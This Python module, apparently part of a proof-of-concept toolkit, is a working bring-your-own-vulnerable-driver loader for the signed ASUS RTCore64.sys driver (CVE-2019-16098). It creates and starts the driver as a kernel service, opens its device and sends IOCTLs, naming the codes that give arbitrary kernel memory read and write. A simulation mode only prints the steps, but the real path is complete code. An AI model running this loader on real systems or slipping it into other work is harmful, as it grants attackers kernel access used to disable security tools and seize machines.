"""
loader.py — Vulnerable Driver Loader (RTCore64 PoC)

Implements the driver loading pipeline:
  1. Copy the driver binary to a writable location
  2. Register it as a Windows service (CreateService)
  3. Start the service (StartService)
  4. Open a handle to the device (CreateFile → DeviceName)

Primary target: RTCore64.sys (ASUS ROG, CVE-2019-16098)
  — Exposes arbitrary kernel read/write via IOCTL 0x80002048 / 0x8000204C
  — Digitally signed, passes driver signature enforcement pre-patch

IMPORTANT: Requires SeLoadDriverPrivilege (typically Administrator).
           On a host machine without admin, _check_privileges() returns False
           and simulate() is used instead of real exploitation.
"""

import os
import sys
import ctypes
import ctypes.wintypes
from pathlib import Path
from typing import Optional

RTCORE64_SERVICE_NAME = "RTCore64"
RTCORE64_DEVICE_NAME  = r"\\.\RTCore64"

IOCTL_READ_KERNEL_MEM  = 0x80002048
IOCTL_WRITE_KERNEL_MEM = 0x8000204C


class LoaderError(Exception):
    pass


class DriverLoader:
    """
    Manages the lifecycle of a BYOVD driver:
        load() → open_device() → (use via KernelOps) → unload()
    """

    def __init__(self, driver_path: Optional[str] = None,
                 service_name: str = RTCORE64_SERVICE_NAME,
                 device_name: str = RTCORE64_DEVICE_NAME,
                 simulate: bool = False):
        self.driver_path  = driver_path
        self.service_name = service_name
        self.device_name  = device_name
        self.simulate     = simulate
        self._device_handle: Optional[int] = None
        self._service_handle: Optional[int] = None
        self._sc_manager: Optional[int] = None

    # ── Privilege check ───────────────────────────────────────────────────────

    @staticmethod
    def check_privileges() -> bool:
        """Return True if running with administrator privileges."""
        if sys.platform != "win32":
            return False
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

    # ── Service management ────────────────────────────────────────────────────

    def load(self) -> bool:
        """
        Register and start the driver as a Windows kernel service.
        Returns True on success, False on failure.
        Raises LoaderError if not running as admin.
        """
        if self.simulate:
            print(f"[BYOVD/SIM] Would load driver: {self.driver_path}")
            print(f"[BYOVD/SIM] CreateService({self.service_name}, KernelDriver)")
            print(f"[BYOVD/SIM] StartService({self.service_name})")
            return True

        if not self.check_privileges():
            raise LoaderError(
                "Administrator privileges required to load a kernel driver. "
                "Run as Admin or use simulate=True for a demo."
            )

        if sys.platform != "win32":
            raise LoaderError("Driver loading only supported on Windows.")

        if not self.driver_path or not os.path.exists(self.driver_path):
            raise LoaderError(f"Driver binary not found: {self.driver_path}")

        return self._create_and_start_service()

    def _create_and_start_service(self) -> bool:
        k32 = ctypes.windll.kernel32
        adv = ctypes.windll.advapi32

        SERVICE_KERNEL_DRIVER   = 0x00000001
        SERVICE_DEMAND_START    = 0x00000003
        SERVICE_ERROR_NORMAL    = 0x00000001
        SC_MANAGER_CREATE_SERVICE = 0x0002
        SERVICE_START           = 0x0010
        SERVICE_STOP            = 0x0020
        SERVICE_QUERY_STATUS    = 0x0004

        abs_path = str(Path(self.driver_path).resolve())

        sc_mgr = adv.OpenSCManagerW(None, None, SC_MANAGER_CREATE_SERVICE)
        if not sc_mgr:
            raise LoaderError(f"OpenSCManager failed: {k32.GetLastError()}")
        self._sc_manager = sc_mgr

        svc = adv.CreateServiceW(
            sc_mgr,
            self.service_name,
            self.service_name,
            SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            abs_path,
            None, None, None, None, None,
        )
        if not svc:
            err = k32.GetLastError()
            if err == 1073:  # ERROR_SERVICE_EXISTS
                svc = adv.OpenServiceW(
                    sc_mgr, self.service_name,
                    SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS
                )
                if not svc:
                    raise LoaderError(f"OpenService failed: {k32.GetLastError()}")
            else:
                raise LoaderError(f"CreateService failed: {err}")

        self._service_handle = svc

        if not adv.StartServiceW(svc, 0, None):
            err = k32.GetLastError()
            if err != 1056:  # ERROR_SERVICE_ALREADY_RUNNING
                raise LoaderError(f"StartService failed: {err}")

        return True

    def open_device(self) -> bool:
        """
        Open a handle to the driver's device object.
        Must be called after load().
        """
        if self.simulate:
            print(f"[BYOVD/SIM] CreateFile({self.device_name})")
            print(f"[BYOVD/SIM] Device handle obtained — kernel access active")
            self._device_handle = 0xFFFF  # sentinel for simulation
            return True

        if sys.platform != "win32":
            return False

        GENERIC_READ  = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x80

        h = ctypes.windll.kernel32.CreateFileW(
            self.device_name,
            GENERIC_READ | GENERIC_WRITE,
            0, None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        INVALID_HANDLE = ctypes.wintypes.HANDLE(-1).value
        if h == INVALID_HANDLE or h == 0:
            raise LoaderError(
                f"CreateFile({self.device_name}) failed: "
                f"{ctypes.windll.kernel32.GetLastError()}"
            )
        self._device_handle = h
        return True

    def unload(self) -> None:
        """Stop the service and remove it from the SCM database."""
        if self.simulate:
            print(f"[BYOVD/SIM] ControlService(STOP) + DeleteService({self.service_name})")
            self._device_handle = None
            return

        if sys.platform != "win32":
            return

        k32 = ctypes.windll.kernel32
        adv = ctypes.windll.advapi32

        if self._device_handle and self._device_handle != 0xFFFF:
            k32.CloseHandle(self._device_handle)
            self._device_handle = None

        if self._service_handle:
            SERVICE_CONTROL_STOP = 0x00000001

            class SERVICE_STATUS(ctypes.Structure):
                _fields_ = [("dwServiceType", ctypes.wintypes.DWORD),
                             ("dwCurrentState", ctypes.wintypes.DWORD),
                             ("dwControlsAccepted", ctypes.wintypes.DWORD),
                             ("dwWin32ExitCode", ctypes.wintypes.DWORD),
                             ("dwServiceSpecificExitCode", ctypes.wintypes.DWORD),
                             ("dwCheckPoint", ctypes.wintypes.DWORD),
                             ("dwWaitHint", ctypes.wintypes.DWORD)]

            ss = SERVICE_STATUS()
            adv.ControlService(self._service_handle, SERVICE_CONTROL_STOP,
                               ctypes.byref(ss))
            adv.DeleteService(self._service_handle)
            adv.CloseServiceHandle(self._service_handle)
            self._service_handle = None

        if self._sc_manager:
            adv.CloseServiceHandle(self._sc_manager)
            self._sc_manager = None

    # ── Low-level IOCTL dispatch ───────────────────────────────────────────────

    def ioctl(self, code: int, in_buf: bytes) -> Optional[bytes]:
        """
        Send an IOCTL to the loaded driver. Returns the output buffer, or None.
        """
        if self.simulate:
            print(f"[BYOVD/SIM] DeviceIoControl(code=0x{code:08X}, in={in_buf.hex()})")
            return b"\x00" * 8

        if not self._device_handle:
            raise LoaderError("Device not opened. Call open_device() first.")

        out_buf = ctypes.create_string_buffer(8)
        bytes_returned = ctypes.wintypes.DWORD(0)

        in_ctypes = ctypes.create_string_buffer(in_buf, len(in_buf))

        ok = ctypes.windll.kernel32.DeviceIoControl(
            self._device_handle,
            code,
            in_ctypes, len(in_buf),
            out_buf, ctypes.sizeof(out_buf),
            ctypes.byref(bytes_returned),
            None,
        )
        if not ok:
            err = ctypes.windll.kernel32.GetLastError()
            raise LoaderError(f"DeviceIoControl failed: {err}")

        return bytes(out_buf[:bytes_returned.value])

    @property
    def is_open(self) -> bool:
        return self._device_handle is not None

    def __enter__(self):
        self.load()
        self.open_device()
        return self

    def __exit__(self, *_):
        self.unload()
